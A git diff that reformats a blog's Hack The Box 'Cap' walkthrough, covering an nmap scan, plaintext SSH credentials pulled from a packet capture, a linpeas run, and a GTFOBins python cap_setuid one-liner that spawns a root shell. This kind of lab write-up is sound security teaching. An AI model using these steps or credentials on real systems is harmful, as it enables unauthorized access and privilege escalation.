@@ -27,8 +27,7 @@ Aye, matey.  Welcome to the Cap box.  We be diggin' for buried treasure...slash 
 
 Let's run the nmap to get the list of open ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌─[us-free-1]─[10.10.14.56]─[biscottidiskette@htb-rm1ratln18]─[~/my_data/machines/cap]
 └──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.245
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 02:30 CST
@@ -45,9 +44,12 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    gunicorn
 
 <snip>
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Navigate to the website on port 80 and view the landing page.
@@ -120,17 +122,14 @@ Reviewing the Info section, retrieve the USER and the PASS openly from the clear
         {% include figure.liquid loading="eager" path="/assets/img/cap/getcreds.png" title="Get the Creds" class="img-fluid rounded z-depth-1" %}
     </div>
 </div>
-{% raw %}
-```
+{% include codebox.html title="Credentials" content="
 nathan:Buck3tH4TF0RM3!
-```
-{% endraw %}
+" %}
 
 <br />
 Use the credentials to log into SSH.
 
-{% raw %}
-```bash
+{% capture sshintomachine %}
 ┌─[us-free-1]─[10.10.14.56]─[biscottidiskette@htb-rm1ratln18]─[~/my_data/machines/cap]
 └──╼ [★]$ ssh nathan@10.10.10.245
 The authenticity of host '10.10.10.245 (10.10.10.245)' can't be established.
@@ -171,14 +170,17 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Sat Jan 11 09:11:18 2025 from 10.10.16.15
 nathan@cap:~$
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sshintomachine %}
 
 <br />
 Get the user flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 nathan@cap:~$ cat user.txt
 <redacted>
 nathan@cap:~$ ifconfig
@@ -200,8 +202,12 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 12562  bytes 964800 (964.8 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Download the <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250110-31084f44">linpeas.sh</a> from the GitHub and transfer it to the victim machine.
@@ -215,8 +221,7 @@ Download the <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20250110
 <br />
 Change linpeas.sh to executable and run linpeas.sh.  Notice the python has cap_setuid capability.
 
-{% raw %}
-```bash
+{% capture runlinpeas %}
 nathan@cap:/dev/shm$ chmod +x linpeas.sh
 nathan@cap:/dev/shm$ ./linpeas.sh
 
@@ -257,8 +262,12 @@ Files with capabilities (limited to 50):
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runlinpeas %}
 
 <br />
 Check python in the <a href="https://gtfobins.github.io/gtfobins/python/">GTFOBins</a> and notice that there is a capabilities section.
@@ -272,19 +281,21 @@ Check python in the <a href="https://gtfobins.github.io/gtfobins/python/">GTFOBi
 <br />
 Execute the python indicated in the GTFOBins.
 
-{% raw %}
-```bash
+{% capture gtfobins %}
 nathan@cap:/dev/shm$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 # whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=gtfobins %}
 
 <br />
 Get the root flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ifconfig
@@ -306,8 +317,12 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         RX errors 0  dropped 0  overruns 0  frame 0
         TX packets 13878  bytes 1066163 (1.0 MB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Thanks so much for reading!
